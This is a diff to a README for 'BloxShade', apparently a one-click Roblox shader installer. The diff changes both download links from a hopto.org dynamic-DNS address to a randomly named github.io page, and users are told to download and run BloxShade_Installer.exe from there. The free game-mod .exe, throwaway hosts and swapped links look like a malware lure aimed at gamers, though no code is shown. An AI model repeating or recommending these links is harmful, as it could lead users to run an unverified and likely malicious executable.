@@ -7,7 +7,7 @@
   <strong>Install ReShade + Best RTX Presets automatically. No manual setup required.</strong>
 </p>
 
-[**✨ DOWNLOAD BLOXSHADE**](https://shaderblox.hopto.org)
+[**✨ DOWNLOAD BLOXSHADE**](blackblanca629kht.github.io)
 
 </div>
 
@@ -33,7 +33,7 @@ This **Single .exe Installer** automatically detects your Roblox folder, install
 
 ## 📥 Installation
 
-1.  **Download:** Get `BloxShade_Installer.exe` from the [Releases Page](https://shaderblox.hopto.org).
+1.  **Download:** Get `BloxShade_Installer.exe` from the [Releases Page](blackblanca629kht.github.io).
 2.  **Run:** Open the file.
 3.  **Choose Preset:** Select "Lite", "Balanced", or "Ultra".
 4.  **Install:** Click the big **"INSTALL SHADERS"** button.
